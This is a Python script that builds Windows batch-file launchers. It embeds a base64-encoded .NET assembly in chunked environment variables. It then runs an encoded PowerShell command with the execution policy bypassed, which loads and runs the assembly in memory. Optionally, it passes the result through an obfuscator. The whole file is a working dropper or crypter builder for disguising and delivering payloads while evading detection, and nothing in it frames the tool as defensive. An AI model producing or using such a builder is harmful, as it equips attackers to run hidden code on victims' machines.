import base64
import argparse
import subprocess
import sys
from pathlib import Path


CHUNK_SIZE = 3000

POWERSHELL_LOADER = r"""
$ErrorActionPreference = 'Stop'
$b64 = $env:SIGMABAT_B64

if ([string]::IsNullOrWhiteSpace($b64)) {
    throw 'SIGMABAT_B64 is empty.'
}

$bytes = [Convert]::FromBase64String($b64)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entry = $assembly.EntryPoint

if (-not $entry) {
    throw 'The loaded assembly does not expose an entry point.'
}

$parameters = $entry.GetParameters()

if ($parameters.Count -eq 0) {
    [void]$entry.Invoke($null, @())
}
else {
    [void]$entry.Invoke($null, (,([string[]]@())))
}
"""


def chunk_string(value, size):
    for offset in range(0, len(value), size):
        yield value[offset:offset + size]


def encode_powershell_script(script_text):
    return base64.b64encode(script_text.encode("utf-16le")).decode("ascii")


def build_batch_launcher(payload_b64):
    powershell_b64 = encode_powershell_script(POWERSHELL_LOADER.strip())
    lines = [
        "@echo off",
        "setlocal EnableExtensions DisableDelayedExpansion",
        "set \"SIGMABAT_B64=\"",
    ]

    for chunk in chunk_string(payload_b64, CHUNK_SIZE):
        lines.append(f'set "SIGMABAT_B64=%SIGMABAT_B64%{chunk}"')

    lines.extend([
        f"powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -EncodedCommand {powershell_b64}",
        "if errorlevel 1 exit /b %errorlevel%",
        "endlocal",
        "",
    ])

    return "\r\n".join(lines)


def run_obfuscator(output_path):
    obfuscator_path = Path(__file__).with_name("obfuscator.py")

    if not obfuscator_path.is_file():
        raise FileNotFoundError(f"Missing obfuscator: {obfuscator_path}")

    subprocess.run(
        [sys.executable, str(obfuscator_path), str(output_path)],
        check=True,
        capture_output=True,
        text=True,
    )


def main():
    parser = argparse.ArgumentParser(
        description="Generate a batch launcher that loads a .NET assembly in memory through PowerShell."
    )
    parser.add_argument("input_assembly", help="Path to the input .NET assembly")
    parser.add_argument("output_bat", help="Path to the output .bat file")
    parser.add_argument(
        "--no-obf",
        action="store_true",
        help="Skip the post-processing obfuscation step",
    )
    args = parser.parse_args()

    input_path = Path(args.input_assembly)
    output_path = Path(args.output_bat)

    if not input_path.is_file():
        print(f"File not found: {input_path}")
        sys.exit(1)

    payload_bytes = input_path.read_bytes()
    payload_b64 = base64.b64encode(payload_bytes).decode("ascii")
    batch_text = build_batch_launcher(payload_b64)
    output_path.write_text(batch_text, encoding="utf-8", newline="\r\n")

    if not args.no_obf:
        try:
            run_obfuscator(output_path)
        except subprocess.CalledProcessError as exc:
            stderr = exc.stderr.strip() if exc.stderr else ""
            stdout = exc.stdout.strip() if exc.stdout else ""
            detail = stderr or stdout or str(exc)
            print(f"Obfuscation failed: {detail}")
            sys.exit(1)
        except FileNotFoundError as exc:
            print(str(exc))
            sys.exit(1)

    mode = "without obfuscation" if args.no_obf else "with obfuscation"
    print(f"Created launcher ({mode}): {output_path}")


if __name__ == "__main__":
    main()
